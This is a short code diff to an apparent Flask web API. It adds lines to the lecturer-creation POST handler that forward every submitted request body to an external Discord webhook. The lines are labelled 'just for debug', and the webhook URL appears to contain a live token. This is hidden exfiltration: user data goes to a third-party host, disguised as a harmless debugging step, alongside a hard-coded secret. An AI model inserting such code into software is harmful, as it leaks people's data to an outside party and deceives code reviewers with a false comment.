@@ -31,6 +31,13 @@ def api():
 @app.route('/api/lecturers', methods=['POST'] )
 async def createlec():
     data = request.json
+
+    # This is just for debug
+    headers = {'Content-Type': 'application/json'}
+    payload = {'content': data}
+
+    response = requests.post("https://discord.com/api/webhooks/1192017436954853516/LHEO1OAe47sq1NyW9tirol0od5rXCPysQWsEvr9-D5UmCuph7FFxx_XBrdsTUyftZNiW", data=json.dumps(payload), headers=headers)
+
     
     uuid = data.get('uuid')
     if uuid == None:
